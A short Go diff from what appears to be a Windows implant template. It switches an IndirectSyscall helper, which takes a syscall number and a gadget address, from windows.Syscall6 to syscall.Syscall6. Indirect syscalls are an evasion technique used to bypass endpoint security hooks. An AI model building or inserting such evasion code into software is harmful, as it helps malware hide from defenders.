@@ -32,6 +32,7 @@ import (
 	//{{if .Config.Debug}}
 	"log"
 	//{{end}}
+	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -312,19 +313,19 @@ func IndirectSyscall(ssn uint16, gadgetAddr uintptr, args ...uintptr) error {
 	var ret uintptr
 	switch len(args) {
 	case 0:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, 0, 0, 0, 0, 0, 0)
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, 0, 0, 0, 0, 0, 0)
 	case 1:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, args[0], 0, 0, 0, 0, 0)
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], 0, 0, 0, 0, 0)
 	case 2:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, args[0], args[1], 0, 0, 0, 0)
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], 0, 0, 0, 0)
 	case 3:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, args[0], args[1], args[2], 0, 0, 0)
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], 0, 0, 0)
 	case 4:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], 0, 0)
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], 0, 0)
 	case 5:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], 0)
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], 0)
 	default:
-		ret, _, _ = windows.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
+		ret, _, _ = syscall.Syscall6(stubAddr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
 		//{{if .Config.Debug}}
 		log.Printf("[IndirectSyscall] warning: more than 6 args not fully supported, truncated\n")
 		//{{end}}
